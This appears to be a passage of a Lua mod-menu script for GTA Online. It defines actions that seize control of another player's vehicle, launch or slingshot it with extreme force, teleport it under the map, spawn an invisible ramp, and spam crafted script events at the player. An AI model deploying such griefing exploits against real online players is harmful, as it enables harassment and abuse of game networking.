        if not PED.IS_PED_IN_ANY_VEHICLE(ped, true) then
            util.toast("They aren't in a vehicle. :/")
            return
        end
        local veh = PED.GET_VEHICLE_PED_IS_IN(ped, false)
        if veh == 0 then
            while veh == 0 do
                util.yield(10)
                veh = PED.GET_VEHICLE_PED_IS_IN(ped, false)
            end
        end
        local ctr = 0
        while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(veh) and ctr < 100 do
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
            ctr = ctr + 1
            util.yield(10)
        end
        if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(veh) and ctr >= 100 then
            util.toast("Failed to get control of the vehicle. :/")
            return
        end
        ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 100000, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
    end)

    menu.action(vehfeat, "Slingshot Vehicle", {}, "", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id) 
        if not PED.IS_PED_IN_ANY_VEHICLE(ped, true) then
            util.toast("They aren't in a vehicle. :/")
            return
        end
        local veh = PED.GET_VEHICLE_PED_IS_IN(ped, false)
        if veh == 0 then
            while veh == 0 do
                util.yield(10)
                veh = PED.GET_VEHICLE_PED_IS_IN(ped, false)
            end
        end
        local ctr = 0
        while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(veh) and ctr < 100 do
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
            ctr = ctr + 1
            util.yield(10)
        end
        if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(veh) and ctr >= 100 then
            util.toast("Failed to get control of the vehicle. :/")
            return
        end
        ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 0.0, 100000, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 100000, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
    end)

    menu.action(vehfeat, "Spawn Ramp In Front Of Player", {}, "", function() 
        local ramp_hash = util.joaat("stt_prop_ramp_jump_s")
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, 0, 10, -2)
        local rot = ENTITY.GET_ENTITY_ROTATION(ped, 2)
        STREAMING.REQUEST_MODEL(ramp_hash)
    	while not STREAMING.HAS_MODEL_LOADED(ramp_hash) do
    		util.yield()
    	end

        local ramp = OBJECT.CREATE_OBJECT(ramp_hash, pos.x, pos.y, pos.z, true, false, true)

        ENTITY.SET_ENTITY_VISIBLE(ramp, false)
        ENTITY.SET_ENTITY_ROTATION(ramp, rot.x, rot.y, rot.z + 90, 0, true)
        util.yield(1000)
        entities.delete_by_handle(ramp)
    end)

    menu.action(vehfeat, "Teleport under the map", {}, "Teleport them in the void", function()
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local c = ENTITY.GET_ENTITY_COORDS(p)
        local veh = PED.GET_VEHICLE_PED_IS_IN(p, false)
        c.z = c.z - 100
        if PED.IS_PED_IN_ANY_VEHICLE(p, false) then
            local success, floorcoords
            repeat
                success, floorcoords = util.get_ground_z(c.x, c.y)
                util.yield()
            until success
            RequestControl(veh)
            floorcoords = floorcoords - 50
            ENTITY.SET_ENTITY_COORDS(veh, c.x, c.y, floorcoords, false, false, false, false) --tp undermap
        else
            util.toast(players.get_name(player_id).. " is not in a vehicle")
        end
    end)

    local otherf = menu.list(todos, "Other Functions", {}, "Random features")

    menu.action(otherf, "Send Player To Cayo", {""}, "Tries to send them by executing a lot of cayo events", function()
        for i = 1, 200 do
            util.trigger_script_event(1 << player_id, {1361475530, player_id, -547323955  , math.random(0, 4), math.random(0, 1), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647),
            math.random(-2147483647, 2147483647), player_id, math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647)})
        end
    end)


end)

util.yield(1100)
util.toast("Fully loaded, enjoy!!")

util.on_stop(function ()
    menu.collect_garbage()
end)


players.dispatch_on_join()